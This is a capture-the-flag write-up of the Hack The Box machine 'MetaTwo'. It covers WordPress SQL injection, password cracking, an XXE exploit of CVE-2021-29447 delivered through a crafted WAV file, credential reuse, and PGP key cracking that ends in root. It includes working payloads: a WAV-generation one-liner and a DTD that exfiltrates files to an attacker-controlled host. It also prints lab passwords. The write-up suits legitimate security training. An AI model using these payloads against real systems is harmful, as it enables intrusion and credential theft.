# MetaTwo

Date Released: 31st October 2022

Date Completed: 7th November 2022

```console
export IP=10.10.11.186
```
Added 'metatwo.htb' to /etc/hosts

Usual Recon
```console
nmap -sC -sV -T4 -A $IP -vv -oN nmap/usual

21/tcp open  ftp?    syn-ack
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0
```

Full Port Scan
```console
sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Whenever I access `http://metatwo.htb`, I got redirected to `http://metapress.htb`

Added `metapress.htb` to /etc/hosts

In `http://metapress.htb/`:
	Wordpress Site

wpscan on `http://metapress.htb`:
```console
wpscan --url metapress.htb --enumerate p,u --plugins-detection aggressive --detection-mode aggressive -o wpscan/metapress.htb
```
Output:
```console
[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
```

At /events:
	If we follow the form, we can view the requests in burp proxy
	I got 3 different requests, saved in:
		appointment_enq.req
		appointment_text.req
		appointment_json.req  <-- sql injectable! (Time Based)

```console
sqlmap -r appointment_json.req --current-user

blog@localhost
```

```console
sqlmap -r appointment_json.req -D blog -T wp_users --dump
```

No progress so far, trying UDP scan
No ports open

There are actually 2 users in the WP db, admin & manager
```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

Found one password: partylikearockstar

**manager:partylikearockstar**

Im in, but im not admin

But I can upload media

So I searched for wordpress 5.6.2 vulnerabilities and it lead me to [a list of vulnerabilities](https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/)

Which then again lead me to [an available exploit](https://github.com/motikan2010/CVE-2021-29447)

I cloned the repository

I started my attacker server
```bash
make up-mal
```

Change the IP address (to my host) in /attacker/www/evil.dtd

Generate the Payload using:
```console
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.9:8001/evil.dtd'"'"'>%remote;%init;%trick;] >\x00'> malicious.wav
```

Now I have the payload malicious.wav

Upload it to the media library using the 'manager' account

On my attacker server:
```bash
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45186 [200]: GET /evil.dtd
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45186 Closing
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45188 Accepted
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45188 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
```

I then decode it using
```console
php attacker/decryption.php
```
But u need to modify the data to decode in the file before u execute the command

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
LFI achieved!

Reading wp-config.php
In evil.dtd:
```dtd
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >
```
Output:
```
[REDACTED]
MYSQL
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

[REDACTED]

FTP
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
[REDACTED]
```

FTPed into ftp.metapress.htb using
metapress.htb:9NYS_ii@FyL_p5M2NvJ

In FTP:
	blog/  <-- Wordpress Site Directory
		wp-content/
			plugins/
				leira-role/  <-- Plugin
	mailer/

In send_mail.php
```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587; 
```

Trying to ssh into jnelson using his SMTP password

### Got shell as jnelson@meta2

Got user.txt at /home/jnelson

Running linpeas.sh

Found interesting files at /home/jnelson/.passpie
	.config  <-- useless file
	.keys  <-- **contains PGP private & public keys**
	ssh/
		jnelson.pass  <-- PGP message
		root.pass  <-- PGP message

After transferring the PGP private & public keys to my box, I imported them into my gpg
```console
gpg --import public_key
gpg --import private_key
```

Importing public_key was successful, but it prompts for a password when I import private_key.

```console
pgp2john private_key > forjohn
```

Bruteforce using johntheripper with rockyou.txt
```console
john -w=/usr/share/wordlists/rockyou.txt forjohn

[REDACTED]
blink182         (Passpie) 
```
Now I have the password for the private key, so I continue to import it

```console
gpg --import private_key
```

Then can proceed to decrypt those 2 PGP messages:
	jnelson.pass
	root.pass

```console
gpg -d jnelson.pass
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
Cb4_JmWM8zUZWMu@Ys
```
And it was the password of the user 'jnelson' that we've found earlier

```console
gpg -d root.pass
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
p7qfAZt4_A1xo_0x
```
So root's password is **p7qfAZt4_A1xo_0x**

Now we can su to root

```console
su root
Password: p7qfAZt4_A1xo_0x
```

### Got shell as root@meta2

Got root.txt at /root!

# Done!
